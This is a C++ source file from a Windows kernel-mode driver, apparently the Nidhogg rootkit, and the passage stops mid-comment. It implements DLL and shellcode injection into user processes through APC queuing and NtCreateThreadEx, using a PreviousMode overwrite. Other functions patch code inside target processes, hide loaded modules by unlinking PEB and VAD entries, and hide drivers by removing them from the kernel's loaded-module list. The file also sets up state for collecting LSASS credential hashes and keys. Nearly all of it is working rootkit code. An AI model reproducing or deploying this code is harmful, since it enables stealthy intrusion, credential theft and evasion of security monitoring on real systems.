#include "pch.h"
#include "MemoryHandler.h"

MemoryHandler::MemoryHandler() {
	NtCreateThreadEx = NULL;
	ssdt = NULL;

	lsassMetadata.Collected = false;
	lsassMetadata.DesKey = NULL;
	lsassMetadata.IvAddress = NULL;
	lsassMetadata.LogonSessionList = NULL;
	lsassMetadata.Lock.Init();
	cachedLsassInfo.Count = 0;
	cachedLsassInfo.Creds = NULL;
	cachedLsassInfo.DesKey.Data = NULL;
	cachedLsassInfo.Lock.Init();

	if (!InitializeList(&hiddenDrivers) || !InitializeList(&hiddenModules))
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	__try {
		ssdt = GetSSDTAddress();
		NtCreateThreadEx = static_cast<tNtCreateThreadEx>(GetSSDTFunctionAddress(ssdt, "NtCreateThreadEx"));
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		ExRaiseStatus(GetExceptionCode());
	}
}

MemoryHandler::~MemoryHandler() {
	IrqlGuard guard;
	guard.SetExitIrql(PASSIVE_LEVEL);

	auto driverCleaner = [](_In_ HiddenDriverEntry* item) -> void {
		NidhoggMemoryHandler->UnhideDriver(item->DriverPath);
	};

	auto moduleCleaner = [](_In_ HiddenModuleEntry* item) -> void {
		NidhoggMemoryHandler->RestoreModule(item);
	};
	ClearList<HiddenItemsList, HiddenDriverEntry>(&hiddenDrivers, driverCleaner);
	ClearList<HiddenItemsList, HiddenModuleEntry>(&hiddenModules, moduleCleaner);

	AutoLock lsassLock(cachedLsassInfo.Lock);
	FreeVirtualMemory(cachedLsassInfo.DesKey.Data);

	if (cachedLsassInfo.Creds) {
		if (cachedLsassInfo.Count != 0) {
			for (ULONG i = 0; i < cachedLsassInfo.Count; i++) {
				if (cachedLsassInfo.Creds[i].Username.Length > 0) {
					RtlFreeUnicodeString(&cachedLsassInfo.Creds[i].Username);
					RtlFreeUnicodeString(&cachedLsassInfo.Creds[i].Domain);
					RtlFreeUnicodeString(&cachedLsassInfo.Creds[i].EncryptedHash);
				}
			}
			cachedLsassInfo.Count = 0;
		}
		FreeVirtualMemory(cachedLsassInfo.Creds);
	}

	if (lsassMetadata.Collected) {
		AutoLock lsassMetaLock(this->lsassMetadata.Lock);
		FreeVirtualMemory(lsassMetadata.DesKey);
		this->lsassMetadata.Collected = false;
	}
}

/*
* Description:
* InjectDllAPC is responsible to inject a dll in a certain usermode process with APC.
*
* Parameters:
* @dllInfo [_In_ IoctlDllInfo&] -- All the information regarding the injected dll.
*
* Returns:
* @status  [NTSTATUS]			  -- Whether successfuly injected or not.
*/
_IRQL_requires_(PASSIVE_LEVEL)
NTSTATUS MemoryHandler::InjectDllAPC(_In_ IoctlDllInfo& dllInfo) {
	PVOID dllPathAddress = nullptr;
	IoctlShellcodeInfo shellcodeInfo{};
	NTSTATUS status = STATUS_SUCCESS;
	WCHAR* mainDriveLetter = nullptr;
	PVOID loadLibraryAddress = nullptr;
	SIZE_T dllPathSize = strlen(dllInfo.DllPath) + 1;
	const WCHAR kernel32[] = L"\\Windows\\System32\\kernel32.dll";
	MemoryAllocator<WCHAR*> fullPath((DRIVE_LETTER_SIZE + wcslen(kernel32)) * sizeof(WCHAR));

	if (!fullPath.IsValid())
		return STATUS_INSUFFICIENT_RESOURCES;

	__try {
		mainDriveLetter = GetMainDriveLetter();
		errno_t err = wcscpy_s(fullPath.Get(), DRIVE_LETTER_SIZE * sizeof(WCHAR), mainDriveLetter);

		if (err != 0)
			ExRaiseStatus(STATUS_INVALID_PARAMETER);
		err = wcscat_s(fullPath.Get(), wcslen(kernel32) * sizeof(WCHAR), kernel32);

		if (err != 0)
			ExRaiseStatus(STATUS_INVALID_PARAMETER);
		loadLibraryAddress = GetUserModeFuncAddress("LoadLibraryA", fullPath.Get(), dllInfo.Pid);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		FreeVirtualMemory(mainDriveLetter);
		return GetExceptionCode();
	}
	FreeVirtualMemory(mainDriveLetter);

	// Creating the shellcode information for APC injection.
	status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &dllPathAddress, 0, &dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!NT_SUCCESS(status) || !dllPathAddress) {
		if (NT_SUCCESS(status))
			status = STATUS_INSUFFICIENT_RESOURCES;
		return status;
	}
	memset(dllPathAddress, 0, dllPathSize);

	dllPathSize = strlen(dllInfo.DllPath) + 1;
	status = WriteProcessMemory(&(dllInfo.DllPath), PsGetCurrentProcess(), dllPathAddress, dllPathSize, KernelMode);

	if (!NT_SUCCESS(status)) {
		ZwFreeVirtualMemory(ZwCurrentProcess(), &dllPathAddress, &dllPathSize, MEM_DECOMMIT);
		return status;
	}

	shellcodeInfo.Parameter1 = dllPathAddress;
	shellcodeInfo.Parameter1Size = dllPathSize;
	shellcodeInfo.Parameter2 = NULL;
	shellcodeInfo.Parameter3 = NULL;
	shellcodeInfo.Pid = dllInfo.Pid;
	shellcodeInfo.Shellcode = loadLibraryAddress;
	shellcodeInfo.ShellcodeSize = sizeof(PVOID);

	status = InjectShellcodeAPC(shellcodeInfo, true);
	ZwFreeVirtualMemory(ZwCurrentProcess(), &dllPathAddress, &dllPathSize, MEM_DECOMMIT);
	return status;
}

/*
* Description:
* InjectDllThread is responsible to inject a dll in a certain usermode process with NtCreateThreadEx.
*
* Parameters:
* @dllInfo [_In_ IoctlDllInfo&] -- All the information regarding the injected dll.
*
* Returns:
* @status  [NTSTATUS]			  -- Whether successfuly injected or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS MemoryHandler::InjectDllThread(_In_ IoctlDllInfo& dllInfo) const {
	OBJECT_ATTRIBUTES objAttr{};
	CLIENT_ID cid = { 0 };
	HANDLE hProcess = NULL;
	HANDLE hTargetThread = NULL;
	PEPROCESS targetProcess = NULL;
	PVOID remoteAddress = NULL;
	PVOID loadLibraryAddress = nullptr;
	WCHAR* mainDriveLetter = nullptr;
	HANDLE pid = UlongToHandle(dllInfo.Pid);
	SIZE_T pathLength = strlen(dllInfo.DllPath) + 1;
	NTSTATUS status = PsLookupProcessByProcessId(pid, &targetProcess);

	if (!NT_SUCCESS(status))
		return status;
	const WCHAR kernel32[] = L"\\Windows\\System32\\kernel32.dll";
	MemoryAllocator<WCHAR*> fullPath((DRIVE_LETTER_SIZE + wcslen(kernel32)) * sizeof(WCHAR));

	if (!fullPath.IsValid())
		return STATUS_INSUFFICIENT_RESOURCES;

	IrqlGuard irqlGuard(PASSIVE_LEVEL);
	__try {
		mainDriveLetter = GetMainDriveLetter();
		errno_t err = wcscpy_s(fullPath.Get(), DRIVE_LETTER_SIZE * sizeof(WCHAR), mainDriveLetter);

		if (err != 0)
			ExRaiseStatus(STATUS_INVALID_PARAMETER);
		err = wcscat_s(fullPath.Get(), wcslen(kernel32) * sizeof(WCHAR), kernel32);

		if (err != 0)
			ExRaiseStatus(STATUS_INVALID_PARAMETER);
		loadLibraryAddress = GetUserModeFuncAddress("LoadLibraryA", fullPath.Get(), dllInfo.Pid);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		FreeVirtualMemory(mainDriveLetter);
		return GetExceptionCode();
	}
	FreeVirtualMemory(mainDriveLetter);
	irqlGuard.UnsetIrql();

	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	cid.UniqueProcess = pid;
	cid.UniqueThread = NULL;

	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);

	if (!NT_SUCCESS(status)) {
		ObDereferenceObject(targetProcess);
		return status;
	}

	status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &pathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

	if (!NT_SUCCESS(status)) {
		ZwClose(hProcess);
		ObDereferenceObject(targetProcess);
		return status;
	}

	pathLength = strlen(dllInfo.DllPath) + 1;

	status = WriteProcessMemory(&(dllInfo.DllPath), targetProcess, remoteAddress, pathLength, KernelMode);

	if (!NT_SUCCESS(status)) {
		ZwFreeVirtualMemory(hProcess, &remoteAddress, &pathLength, MEM_DECOMMIT);
		ZwClose(hProcess);
		ObDereferenceObject(targetProcess);
		return status;
	}

	// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	PCHAR previousMode = reinterpret_cast<PCHAR>(reinterpret_cast<PUCHAR>(PsGetCurrentThread()) + THREAD_PREVIOUSMODE_OFFSET);
	CHAR tmpPreviousMode = *previousMode;
	*previousMode = KernelMode;
	status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, static_cast<PTHREAD_START_ROUTINE>(loadLibraryAddress),
		remoteAddress, 0, NULL, NULL, NULL, NULL);
	*previousMode = tmpPreviousMode;

	if (hTargetThread)
		ZwClose(hTargetThread);

	if (!NT_SUCCESS(status))
		ZwFreeVirtualMemory(hProcess, &remoteAddress, &pathLength, MEM_DECOMMIT);

	ZwClose(hProcess);
	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* InjectShellcodeAPC is responsible to inject a shellcode in a certain usermode process.
*
* Parameters:
* @ShellcodeInfo [_In_ IoctlShellcodeInfo&] -- All the information regarding the injected shellcode.
* @isInjectedDll [_In_ bool]				  -- Whether the shellcode is injected from InjectDllAPC or not.
*
* Returns:
* @status		 [NTSTATUS]					  -- Whether successfuly injected or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS MemoryHandler::InjectShellcodeAPC(_In_ IoctlShellcodeInfo& shellcodeInformation, _In_ bool isInjectedDll) {
	OBJECT_ATTRIBUTES objAttr{};
	CLIENT_ID cid = { 0 };
	HANDLE hProcess = NULL;
	PEPROCESS targetProcess = NULL;
	PETHREAD targetThread = NULL;
	PKAPC shellcodeApc = NULL;
	PKAPC prepareApc = NULL;
	PVOID remoteAddress = NULL;
	NTSTATUS status = STATUS_SUCCESS;
	PVOID remoteData = NULL;
	SIZE_T dataSize = isInjectedDll ? shellcodeInformation.Parameter1Size : shellcodeInformation.ShellcodeSize;

	if (!shellcodeInformation.Shellcode || dataSize == 0)
		return STATUS_INVALID_PARAMETER;
	HANDLE pid = UlongToHandle(shellcodeInformation.Pid);
	status = PsLookupProcessByProcessId(pid, &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	// Find APC suitable thread.
	__try {
		targetThread = FindAlertableThread(pid);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		ObDereferenceObject(targetProcess);
		return GetExceptionCode();
	}

	do {
		if (!NT_SUCCESS(status) || !targetThread) {
			if (NT_SUCCESS(status))
				status = STATUS_NOT_FOUND;
			break;
		}

		// Allocate and write the shellcode.
		InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
		cid.UniqueProcess = pid;
		cid.UniqueThread = NULL;

		status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);

		if (!NT_SUCCESS(status))
			break;

		status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

		if (!NT_SUCCESS(status))
			break;

		dataSize = isInjectedDll ? shellcodeInformation.Parameter1Size : shellcodeInformation.ShellcodeSize;
		remoteData = isInjectedDll ? shellcodeInformation.Parameter1 : shellcodeInformation.Shellcode;
		status = WriteProcessMemory(remoteData, targetProcess, remoteAddress, dataSize, UserMode);

		if (!NT_SUCCESS(status))
			break;

		// Create and execute the APCs.
		shellcodeApc = AllocateMemory<PKAPC>(sizeof(KAPC), false);
		prepareApc = AllocateMemory<PKAPC>(sizeof(KAPC), false);

		if (!shellcodeApc || !prepareApc) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		KeInitializeApc(prepareApc, targetThread, OriginalApcEnvironment, static_cast<PKKERNEL_ROUTINE>(&PrepareApcCallback), NULL, NULL, KernelMode, NULL);

		if (isInjectedDll)
			KeInitializeApc(shellcodeApc, targetThread, OriginalApcEnvironment, static_cast<PKKERNEL_ROUTINE>(&ApcInjectionCallback), 
				NULL, static_cast<PKNORMAL_ROUTINE>(shellcodeInformation.Shellcode), UserMode, remoteAddress);
		else
			KeInitializeApc(shellcodeApc, targetThread, OriginalApcEnvironment, static_cast<PKKERNEL_ROUTINE>(&ApcInjectionCallback), 
				NULL, static_cast<PKNORMAL_ROUTINE>(remoteAddress), UserMode, shellcodeInformation.Parameter1);

		if (!KeInsertQueueApc(shellcodeApc, shellcodeInformation.Parameter2, shellcodeInformation.Parameter3, FALSE)) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		if (!KeInsertQueueApc(prepareApc, NULL, NULL, FALSE)) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		if (PsIsThreadTerminating(targetThread))
			status = STATUS_THREAD_IS_TERMINATING;

	} while (false);


	if (!NT_SUCCESS(status)) {
		if (remoteAddress)
			ZwFreeVirtualMemory(hProcess, &remoteAddress, &dataSize, MEM_DECOMMIT);
		FreeVirtualMemory(prepareApc);
		FreeVirtualMemory(shellcodeApc);
	}

	if (targetThread)
		ObDereferenceObject(targetThread);

	if (targetProcess)
		ObDereferenceObject(targetProcess);

	if (hProcess)
		ZwClose(hProcess);

	return status;
}

/*
* Description:
* InjectShellcodeThread is responsible to inject a shellcode in a certain usermode process with NtCreateThreadEx.
*
* Parameters:
* @ShellcodeInfo [_In_ IoctlShellcodeInfo&] -- All the information regarding the injected shellcode.
*
* Returns:
* @status		 [NTSTATUS]					  -- Whether successfuly injected or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS MemoryHandler::InjectShellcodeThread(_In_ IoctlShellcodeInfo& shellcodeInfo) const {
	OBJECT_ATTRIBUTES objAttr{};
	CLIENT_ID cid = { 0 };
	HANDLE hProcess = NULL;
	HANDLE hTargetThread = NULL;
	PEPROCESS targetProcess = NULL;
	PVOID remoteAddress = NULL;
	SIZE_T shellcodeSize = shellcodeInfo.ShellcodeSize;
	HANDLE pid = UlongToHandle(shellcodeInfo.Pid);
	NTSTATUS status = PsLookupProcessByProcessId(pid, &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	cid.UniqueProcess = pid;
	cid.UniqueThread = NULL;
	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);

	do {
		if (!NT_SUCCESS(status))
			break;
		status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

		if (!NT_SUCCESS(status))
			break;
		shellcodeSize = shellcodeInfo.ShellcodeSize;
		status = WriteProcessMemory(shellcodeInfo.Shellcode, targetProcess, remoteAddress, shellcodeSize, KernelMode);

		if (!NT_SUCCESS(status))
			break;

		// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
		InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
		PCHAR previousMode = reinterpret_cast<PCHAR>(reinterpret_cast<PUCHAR>(PsGetCurrentThread()) + THREAD_PREVIOUSMODE_OFFSET);
		CHAR tmpPreviousMode = *previousMode;
		*previousMode = KernelMode;
		status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, 
			static_cast<PTHREAD_START_ROUTINE>(remoteAddress), NULL, 0, NULL, NULL, NULL, NULL);
		*previousMode = tmpPreviousMode;

	} while (false);

	if (hTargetThread)
		ZwClose(hTargetThread);

	if (!NT_SUCCESS(status) && remoteAddress)
		ZwFreeVirtualMemory(hProcess, &remoteAddress, &shellcodeSize, MEM_DECOMMIT);

	if (hProcess)
		ZwClose(hProcess);

	if (targetProcess)
		ObDereferenceObject(targetProcess);

	return status;
}

/*
* Description:
* PatchModule is responsible for patching a certain moudle in a certain process.
*
* Parameters:
* @ModuleInformation [_In_ IoctlPatchedModule&] -- All the information regarding the module that needs to be patched.
*
* Returns:
* @status			 [NTSTATUS]			   -- Whether successfuly patched or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS MemoryHandler::PatchModule(_In_ IoctlPatchedModule& moduleInformation) {
	PEPROCESS targetProcess = nullptr;
	PVOID functionAddress = NULL;
	
	NTSTATUS status = PsLookupProcessByProcessId(ULongToHandle(moduleInformation.Pid), &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	// Getting the PEB.
	__try {
		functionAddress = GetUserModeFuncAddress(moduleInformation.FunctionName, moduleInformation.ModuleName, moduleInformation.Pid);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		ObDereferenceObject(targetProcess);
		return GetExceptionCode();
	}
	status = WriteProcessMemory(moduleInformation.Patch, targetProcess, functionAddress, moduleInformation.PatchLength, KernelMode);
	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* HideModule is responsible for hiding user mode module that is loaded in a process.
*
* Parameters:
* @moduleInformation [_In_ IoctlHiddenModuleInfo&] -- Required information, contains PID and module's name.
*
* Returns:
* @status			 [NTSTATUS]						 -- Whether successfuly hidden or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS MemoryHandler::HideModule(_In_ IoctlHiddenModuleInfo& moduleInformation) {
	PLDR_DATA_TABLE_ENTRY pebEntry = nullptr;
	KAPC_STATE state;
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS targetProcess = NULL;
	LARGE_INTEGER time = { 0 };
	PVOID moduleBase = NULL;
	HiddenModuleEntry entry = { 0 };
	time.QuadPart = ONE_SECOND;

	if (!moduleInformation.ModuleName || moduleInformation.Pid == SYSTEM_PROCESS_PID)
		return STATUS_INVALID_PARAMETER;
	SIZE_T moduleNameLen = wcslen(moduleInformation.ModuleName);

	// Getting the process's PEB.
	status = PsLookupProcessByProcessId(ULongToHandle(moduleInformation.Pid), &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	entry.ModuleName = AllocateMemory<WCHAR*>((moduleNameLen + 1) * sizeof(WCHAR));

	if (!entry.ModuleName) {
		ObDereferenceObject(targetProcess);
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	errno_t err = wcscpy_s(entry.ModuleName, (moduleNameLen + 1) * sizeof(WCHAR), moduleInformation.ModuleName);

	if (err != 0) {
		FreeVirtualMemory(entry.ModuleName);
		ObDereferenceObject(targetProcess);
		return STATUS_INVALID_PARAMETER;
	}

	do {
		KeStackAttachProcess(targetProcess, &state);
		PREALPEB targetPeb = reinterpret_cast<PREALPEB>(PsGetProcessPeb(targetProcess));

		if (!targetPeb) {
			KeUnstackDetachProcess(&state);
			status = STATUS_ABANDONED;
			break;
		}

		for (UINT16 i = 0; !targetPeb->LoaderData && i < 10; i++) {
			KeDelayExecutionThread(KernelMode, FALSE, &time);
		}

		if (!targetPeb->LoaderData) {
			KeUnstackDetachProcess(&state);
			status = STATUS_ABANDONED_WAIT_0;
			break;
		}

		if (!&targetPeb->LoaderData->InLoadOrderModuleList) {
			KeUnstackDetachProcess(&state);
			status = STATUS_ABANDONED_WAIT_0;
			break;
		}

		// Finding the module inside the process.
		status = STATUS_NOT_FOUND;

		for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
			pListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
			pListEntry = pListEntry->Flink) {

			pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

			if (!pebEntry) {
				continue;
			}

			if (pebEntry->FullDllName.Length / sizeof(WCHAR) != moduleNameLen) {
				continue;
			}

			if (_wcsnicmp(pebEntry->FullDllName.Buffer, moduleInformation.ModuleName, moduleNameLen) == 0) {
				entry.OriginalEntry = pListEntry;
				entry.Pid = moduleInformation.Pid;
				entry.Links.InLoadOrderLinks = pebEntry->InLoadOrderLinks;
				entry.Links.InInitializationOrderLinks = pebEntry->InInitializationOrderLinks;
				entry.Links.InMemoryOrderLinks = pebEntry->InMemoryOrderLinks;
				entry.Links.HashLinks = pebEntry->HashLinks;
				moduleBase = pebEntry->DllBase;
				RemoveEntryList(&pebEntry->InLoadOrderLinks);
				RemoveEntryList(&pebEntry->InInitializationOrderLinks);
				RemoveEntryList(&pebEntry->InMemoryOrderLinks);
				RemoveEntryList(&pebEntry->HashLinks);
				status = STATUS_SUCCESS;
				break;
			}
		}
		KeUnstackDetachProcess(&state);
	} while (false);

	if (!NT_SUCCESS(status)) {
		FreeVirtualMemory(entry.ModuleName);
		ObDereferenceObject(targetProcess);
		return status;
	}
	status = VadHideObject(targetProcess, reinterpret_cast<ULONG_PTR>(moduleBase), entry);

	// Need to handle the case where the module is incorrectly hidden carefully to avoid BSOD.
	if (!NT_SUCCESS(status)) {
		if (!NT_SUCCESS(RestorePebModule(targetProcess, &entry)))
			status = STATUS_UNSUCCESSFUL;
		FreeVirtualMemory(entry.ModuleName);
		ObDereferenceObject(targetProcess);
		return status;
	}

	if (!AddHiddenModule(entry)) {
		ObDereferenceObject(targetProcess);
		status = RestoreModule(&entry);

		if (NT_SUCCESS(status))
			status = STATUS_INSUFFICIENT_RESOURCES;
		return status;
	}

	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* RestoreModule is responsible for restoring a hidden user mode module that is loaded in a process.
* 
* Parameters:
* @moduleInformation [_In_ IoctlHiddenModuleInfo&] -- Required information, contains PID and module's name.
* 
* Returns:
* @status			 [NTSTATUS]						 -- Whether successfuly restored or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS MemoryHandler::RestoreModule(_In_ IoctlHiddenModuleInfo& moduleInformation) {
	HiddenModuleEntry* entry = nullptr;

	__try {
		entry = FindHiddenModule(moduleInformation);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return GetExceptionCode();
	}
	return RestoreModule(entry);
}

_IRQL_requires_max_(APC_LEVEL)
void MemoryHandler::RestoreModules(_In_ ULONG pid) {
	auto finder = [](_In_ const HiddenModuleEntry* item, _In_ ULONG pid) {
		return item->Pid == pid;
	};
	HiddenModuleEntry* item = FindListEntry<HiddenItemsList, HiddenModuleEntry, ULONG>(hiddenModules, pid, finder);

	while (item) {
		RestoreModule(item);
		item = FindListEntry<HiddenItemsList, HiddenModuleEntry, ULONG>(hiddenModules, pid, finder);
	}
}

/*
* Description:
* RestoreModule is responsible for restoring a hidden user mode module that is loaded in a process.
* 
* Parameters:
* @moduleEntry [_In_ HiddenModuleEntry*] -- Required information, contains the module's entry.
* 
* Returns:
* @status	   [NTSTATUS]				 -- Whether successfuly restored or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS MemoryHandler::RestoreModule(_In_ HiddenModuleEntry* moduleEntry) {
	KAPC_STATE state = { 0 };
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS targetProcess = NULL;
	LARGE_INTEGER time = { 0 };
	time.QuadPart = ONE_SECOND;

	if (!moduleEntry)
		return STATUS_INVALID_PARAMETER;
	status = PsLookupProcessByProcessId(ULongToHandle(moduleEntry->Pid), &targetProcess);

	if (!NT_SUCCESS(status))
		return status;
	status = RestorePebModule(targetProcess, moduleEntry);

	if (!NT_SUCCESS(status)) {
		ObDereferenceObject(targetProcess);
		return status;
	}

	if (NT_SUCCESS(status))
		status = VadRestoreObject(targetProcess, moduleEntry->VadNode, moduleEntry->ModuleName);
	FreeVirtualMemory(moduleEntry->ModuleName);
	FreeVirtualMemory(moduleEntry->VadModuleName);

	if (IsValidListEntry(&moduleEntry->Entry) && !RemoveListEntry(&hiddenModules, moduleEntry))
		status = STATUS_UNSUCCESSFUL;
	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* RestorePebModule is responsible for restoring a hidden user mode module that is loaded in a process.
* 
* Parameters:
* @process		[_In_ PEPROCESS&]		  -- Required information, contains the process's EPROCESS.
* @moduleEntry	[_In_ HiddenModuleEntry&] -- Required information, contains the module's entry.
* 
* Returns:
* @status		[NTSTATUS]				  -- Whether successfuly restored or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS MemoryHandler::RestorePebModule(_In_ PEPROCESS& process, _In_ HiddenModuleEntry* moduleEntry) {
	KAPC_STATE state = { 0 };
	PLDR_DATA_TABLE_ENTRY pebEntry = nullptr;
	LARGE_INTEGER time = { 0 };
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	time.QuadPart = ONE_SECOND;

	constexpr auto RestoreEntry = [](PLDR_DATA_TABLE_ENTRY pebEntry, HiddenModuleEntry* entry) -> bool {
		if ((!IsValidListEntry(&pebEntry->InLoadOrderLinks) && IsValidListEntry(&entry->Links.InLoadOrderLinks)) || 
			(!IsValidListEntry(&pebEntry->InInitializationOrderLinks) && IsValidListEntry(&entry->Links.InInitializationOrderLinks)) ||
			(!IsValidListEntry(&pebEntry->InMemoryOrderLinks) && IsValidListEntry(&entry->Links.InMemoryOrderLinks)) ||
			(!IsValidListEntry(&pebEntry->HashLinks) && IsValidListEntry(&entry->Links.HashLinks))) {
			return false;
		}
		__try {
			if (IsValidListEntry(&entry->Links.InLoadOrderLinks))
				InsertHeadList(&pebEntry->InLoadOrderLinks, &entry->Links.InLoadOrderLinks);
			if (IsValidListEntry(&entry->Links.InInitializationOrderLinks))
				InsertHeadList(&pebEntry->InInitializationOrderLinks, &entry->Links.InInitializationOrderLinks);
			if (IsValidListEntry(&entry->Links.InMemoryOrderLinks))
				InsertHeadList(&pebEntry->InMemoryOrderLinks, &entry->Links.InMemoryOrderLinks);
			if (IsValidListEntry(&entry->Links.HashLinks))
				InsertHeadList(&pebEntry->HashLinks, &entry->Links.HashLinks);
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			return false;
		}
		return true;
	};

	if (!process || !moduleEntry)
		return STATUS_INVALID_PARAMETER;
	KeStackAttachProcess(process, &state);

	do {
		PREALPEB targetPeb = reinterpret_cast<PREALPEB>(PsGetProcessPeb(process));

		if (!targetPeb) {
			status = STATUS_ABANDONED;
			break;
		}

		for (UINT16 i = 0; !targetPeb->LoaderData && i < 10; i++) {
			KeDelayExecutionThread(KernelMode, FALSE, &time);
		}

		if (!targetPeb->LoaderData) {
			status = STATUS_ABANDONED_WAIT_0;
			break;
		}

		if (!&targetPeb->LoaderData->InLoadOrderModuleList) {
			status = STATUS_ABANDONED_WAIT_0;
			break;
		}

		// First validate that moduleEntry->OriginalEntry is valid before accessing its members
		if (!moduleEntry->OriginalEntry || !IsValidListEntry(moduleEntry->OriginalEntry)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (moduleEntry->OriginalEntry->Blink && IsValidListEntry(moduleEntry->OriginalEntry->Blink)) {
			pebEntry = CONTAINING_RECORD(moduleEntry->OriginalEntry->Blink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

			if (RestoreEntry(pebEntry, moduleEntry)) {
				status = STATUS_SUCCESS;
				break;
			}
		}
			
		if (moduleEntry->OriginalEntry->Flink && IsValidListEntry(moduleEntry->OriginalEntry->Flink)) {
			pebEntry = CONTAINING_RECORD(moduleEntry->OriginalEntry->Flink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

			if (RestoreEntry(pebEntry, moduleEntry)) {
				status = STATUS_SUCCESS;
				break;
			}
		}

		// Fallback: iterate through the entire list
		for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
			pListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
			pListEntry = pListEntry->Flink) {

			pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

			if (pebEntry && IsValidListEntry(&pebEntry->InLoadOrderLinks)) {
				if (RestoreEntry(pebEntry, moduleEntry)) {
					status = STATUS_SUCCESS;
					break;
				}
			}
		}
	} while (false);
	
	KeUnstackDetachProcess(&state);
	return status;
}

/*
* Description:
* HideDriver is responsible for hiding a kernel driver.
*
* Parameters:
* @driverPath [wchar_t*] -- Required information, contains the driver's information.
*
* Returns:
* @status	  [NTSTATUS] -- Whether successfuly hidden or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS MemoryHandler::HideDriver(_In_ wchar_t* driverPath) {
	HiddenDriverEntry hiddenDriver = { 0 };
	PKLDR_DATA_TABLE_ENTRY loadedModulesEntry = NULL;
	NTSTATUS status = STATUS_NOT_FOUND;

	if (!IsValidPath(driverPath))
		return STATUS_INVALID_PARAMETER;

	if (!ExAcquireResourceExclusiveLite(PsLoadedModuleResource, 1))
		return STATUS_ABANDONED;

	for (PLIST_ENTRY pListEntry = PsLoadedModuleList->InLoadOrderLinks.Flink;
		pListEntry != &PsLoadedModuleList->InLoadOrderLinks;
		pListEntry = pListEntry->Flink) {

		loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if (_wcsnicmp(loadedModulesEntry->FullDllName.Buffer, driverPath,
			loadedModulesEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
			errno_t err = wcscpy_s(hiddenDriver.DriverPath, (loadedModulesEntry->FullDllName.Length + sizeof(wchar_t)) * sizeof(wchar_t), 
				loadedModulesEntry->FullDllName.Buffer);

			if (err != 0) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}
			hiddenDriver.OriginalEntry = loadedModulesEntry;

			if (!AddHiddenDriver(hiddenDriver)) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			RemoveEntryList(&loadedModulesEntry->InLoadOrderLinks);
			status = STATUS_SUCCESS;
			break;
		}
	}

	ExReleaseResourceLite(PsLoadedModuleResource);
	return status;
}

/*
* Description:
